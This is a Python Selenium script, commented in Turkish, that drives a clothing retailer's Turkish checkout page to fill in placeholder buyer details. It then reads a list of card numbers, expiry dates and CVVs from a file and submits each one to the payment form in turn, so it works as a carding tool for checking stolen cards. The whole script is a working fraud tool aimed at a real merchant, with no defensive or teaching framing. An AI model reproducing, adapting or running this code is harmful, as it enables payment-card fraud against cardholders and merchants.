from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from time import sleep
from colorama import Fore, Back, Style

def funct():
    CCList = open(input('CCs List: '), 'r').read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split('|')
        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3], ))

    return kartlar



user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
profile = webdriver.FirefoxProfile() 
profile.set_preference("general.useragent.override", user_agent)
driver = webdriver.Firefox(profile)
driver.set_window_size(360,640)

print(Fore.RED + ' ---     ██████╗░██╗░░░██╗███╗░░░███╗██████╗░███╗░░██╗-- -')
print(Fore.RED + ' ---     ██╔══██╗██║░░░██║████╗░████║╚════██╗████╗░██║-- - ')
print(Fore.RED + '  --  -  ██║░░██║██║░░░██║██╔████╔██║░█████╔╝██╔██╗██║- --')
print(Fore.RED + '-   - -  ██║░░██║██║░░░██║██║╚██╔╝██║░╚═══██╗██║╚████║-- -')
print(Fore.RED + '- -   -  ██████╔╝╚██████╔╝██║░╚═╝░██║██████╔╝██║░╚███║--  -')
print(Fore.RED + ' -   -  -╚═════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚══╝--  -')
print(Back.GREEN + '                Allah Çarpsın Çekliyor             ' + Style.RESET_ALL)


driver.get("https://www.bershka.com/tr/flamin%E2%80%99-orange-uv-oje-c0p102759036.html?colorId=615&stylismId=1")
sleep(5)
driver.find_element_by_xpath("//*[@id='onetrust-close-btn-container']").click()
sleep(2)
driver.find_element_by_xpath("/html/body/div[2]/div/div/div[1]/div/div/section/section/div[4]").click()
print(Fore.RED + "Ürün Ekleniyor")
sleep(2)
driver.find_element_by_xpath("/html/body/div[2]/div/div/div[1]/header/nav/div[3]/a").click()
sleep(3)
driver.find_element_by_xpath("/html/body/div[2]/div/div/div[1]/header/nav/div[3]/a/span/span[2]/img").click()
sleep(4)
driver.find_element_by_xpath("/html/body/div[2]/div/div/div[1]/div/div/div/section/div[3]/div/a").click()
sleep(4)
driver.find_element_by_xpath("/html/body/div[2]/div/div/div[1]/div/div/div/section/div[4]/div/div[2]/button").click()
sleep(7)
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div/checkout-shipping/div/div[1]/shipping-methods/shipping-method[1]/div/span").click()
print(Fore.RED + "Checkout Tiklandi")
sleep(4)
driver.find_element_by_css_selector(".ellipsis").click()
sleep(3)
driver.find_element_by_css_selector("#store-search").click()
print(Fore.RED + "Mağaza Aranıyor")
sleep(3)
driver.find_element_by_css_selector("#store-search").send_keys("a")
sleep(3)
driver.find_element_by_css_selector("button.inverse:nth-child(2)").click()
sleep(10)
driver.find_element_by_css_selector("bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)").click()
print(Fore.RED + "Mağaza Secildi")
sleep(3)
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div").click()
print(Fore.RED + "Satin alma bilgileri giriliyor .")
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input").send_keys("aheeds")
print(Fore.RED + "Satin alma bilgileri giriliyor ..")
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
print(Fore.RED + "Satin alma bilgileri giriliyor ....")
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limdert")
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").click()
print(Fore.RED + "Satin alma bilgileri giriliyor .....")
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").send_keys("ka33s3met@mail.com")
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5544443565")
sleep(1)
print(Fore.RED + "Satin alma bilgileri giriliyor ......")
print(Fore.RED + "Devam Et button Araniyor")
driver.find_element_by_css_selector(".ellipsis").click()
print(Fore.RED + "Devam Et Tiklandi")
print(Fore.RED + "Kart Tipi Seciliyor.")
sleep(3)
driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/payment-methods/div/div/payment-method[2]/div/span[1]").click()
print(Fore.RED + "Kart Tipi Secildi... ok ")
#/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/payment-methods/div/div/payment-method[1]/div/span[1]     visa
#/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/payment-methods/div/div/payment-method[2]/div/span[1]  master


sayisi = 0
tikli = False
kartlar = funct() # Text içindeki tüm kartları al
for (cc, mm, yy, cvv) in kartlar:                            
    ##print("Kart Türünü Seç ve enter bas.")
    ##input(" Secim Yaptınmı ?")
    driver.find_element_by_name("number").click()
    driver.find_element_by_name("number").clear()
    driver.find_element_by_name("number").send_keys(cc)
    sayisi+=1
    numara = driver.find_element_by_name("number").get_attribute('value')
    print(Fore.RED + Back.GREEN + str(numara) + ". Numarali Kart Deneniyor" + Style.RESET_ALL)
    driver.find_element_by_name("month").click()
    driver.find_element_by_name("month").send_keys(mm)
    driver.find_element_by_name("year").click()
    driver.find_element_by_name("year").send_keys(yy)
    driver.find_element_by_name("cvv2").clear()
    driver.find_element_by_name("cvv2").click()
    driver.find_element_by_name("cvv2").send_keys(cvv)
    driver.find_element_by_name("holder").clear()
    driver.find_element_by_name("holder").send_keys("alican ase")
    x=driver.find_element_by_name("number").is_displayed()
    if tikli == False:
        driver.find_element_by_name("privacyPolicy").click()
    tikli = True
    driver.find_element_by_css_selector(".ellipsis").click()
    driver.execute_script("window.scrollTo(0,0)")
    sleep(5)
    driver.find_element_by_xpath("/html/body/div[23]/div[1]/button").click()
    #cevap = input("DEVAM ? :s(y): ")
    #if cevap == ('y'):
     #   print("Diğer Karta Geçiliyor...")
    #else:
     #   exit(1)
    sleep(1)
